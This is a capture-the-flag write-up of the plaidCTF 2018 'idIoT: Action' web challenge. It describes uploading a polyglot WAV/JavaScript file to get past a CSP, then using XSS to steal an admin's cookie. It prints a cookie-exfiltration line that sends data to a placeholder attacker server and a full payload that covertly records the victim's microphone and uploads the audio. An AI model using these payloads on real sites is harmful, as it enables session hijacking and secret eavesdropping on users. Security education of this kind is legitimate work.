# idIoT: Action
*plaidCTF 2018 Web 200*


## Problem

Some people won't let any smart devices in their home at all. Some are cautious, do their research, and make an informed decision. This guy falls in neither category; he's a a downright idIoT. 

The idIoT uses this service called [clipshare](https://idiot.chal.pwning.xxx/); you can find his account [here](https://idiot.chal.pwning.xxx/user.php?id=3427e48e-a6eb-4323-aed4-3ce4a83d4f46) or here after you make an account. 

He was telling me the other day about how he has a Google Home next to his computer running at all times. He also told me that if you ask politely it will tell you the flag. However, while he'll look at anything you share, he closes it almost immediately if he doesn't seem like it'll interest him. Maybe we can look at his clips to find something to match his interests? 

(Flag format: PCTF{xxx} where xxx is some text composed of lower-case letters and underscores)

## Look up
We can write a new clip with out title, description and some audio. Audio can be uploaded, or can be recorded using our browser. After some simpletest, we can find 'Description' field allows us `HTML Tag Injection`, but not `<script>` becuase of its CSP.

![Tag injected](https://i.imgur.com/F4fv0PF.png)
![CSP](https://i.imgur.com/hvCZdyr.png)

Since CSP exists `script-src 'self'`, XSS shoud be able by uploading some scripts to clip and including it.

## Weak audio check and MIME type

Server refuses the fiel when its extension is not ended with `.wav/.wave/.mp3/.ogg/.web`. But it doesn't seems strictly check it. We can upload some corrupted audio files like this one!
![Is this real wav?](https://i.imgur.com/15mYPVI.png)

It considered as normal wave file since its magic number, but it also can be translated as following javascript.

```javascript
RIFF=1;
alert('test');
```

I've tried script injection with .wav and .mp3 files, but both of them didn't work. It couldn't pass the MIME type check. ![mpeg MIME is not executable](https://i.imgur.com/5wBeF6O.png)

So I googled about it then I can find a document that lists [default apache MIME types](https://svn.apache.org/repos/asf/httpd/httpd/trunk/docs/conf/mime.types)
![What is wave??](https://i.imgur.com/c5X5Dup.png)

We can see apache doesn't recognize `.wave` extension as `audio/*`, thus including `.wave` file like following allows to script execution.

```html
<script src="uploads/upload_5aeea228222b70.00604196.wave"></script>
```

## Get a flag
Two steps required to get a flag.

* Show admin's clips
* Record a response of Google Home.  

### Show clips of admin
Since we know how to execute javascript, stealing is easy. Various way to steal admin's clip.

```javascript
location.href = <your server> + "?ck=" + "document.cookie"
```

After we change our session to admin's session, we can see two clips.

First clip is

	Title; Thoughts on Google Home
	
	I got a Google Home recently, and I've been having a lot of fun with it!
		
and next one is
 
	Title; Nostalgia
	
	Has anyone else played Toaster Wars?
	Share me clips with 'spatulate' in the description and I'll give them a listen!
	
By the audio clip of first clip I mentioned, if we say "Hey Google, what is a flag?" to Google Home, it will answer the flag. So the next thing to do is record audio "Hey Google, what is a flag?" and write a description as 'spatulate' to Google Home listen it.

### Record from admin's account
We already know how to get a flag. But it has a problem. We can guess Google Home **speaks** the flag, then how can we get it? `js/main.js` has the answer. `main.js` has implementations to deal with this problem. 

![record, submit](https://i.imgur.com/if9YeMI.png)

If we reconstruct javascripts using those implementations of record and submit, we can write a new clip! But admin's account seems can't write a new clip, so we have to write it to our own account by chainging session.

So final payload is

Description field:

```html
spatulate
<form action="create.php" method="post" enctype="multipart/form-data" id="upload-form">
	<input type="text" name="title" value="answer"/>
	<input type="text" name="description" value="answer"/>
	<audio id="record-playback" controls></audio>
	<input type="submit" name="submit" value="submit" />
</form>
<script src="uploads/upload_5aeea228222b70.00604196.wave"></script>
```

Script in .wave:

```javascript
navigator.mediaDevices.getUserMedia({ audio: true })
	.then((stream) => {
	mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
	mediaRecorder.start();
	let chunks = [];
	mediaRecorder.addEventListener("dataavailable", (e) => {th
		chunks.push(e.data);
		console.log(e.data);
	});
	mediaRecorder.addEventListener("stop", () => {
		mediaBlob = new Blob(chunks);
		document.cookie = "PHPSESSID=v3368khvdmn5pl8ea6qh5g3ke3";
	
		let uploadForm = document.getElementById("upload-form");
		let formData = new FormData(uploadForm);
	   	formData.append("audiofile", mediaBlob, "audio.webm");
	   	let f = fetch("create.php", {
			method: "POST",
			body: formData,
			credentials: "same-origin"
		});	
	})
	setTimeout(function() {
		mediaRecorder.stop();
	}, 15000);
});
```	

###Final
Injected script will write a new clip named 'answer' with an audio reading flag :D

The flag is `PCTF{not_so_smart}`
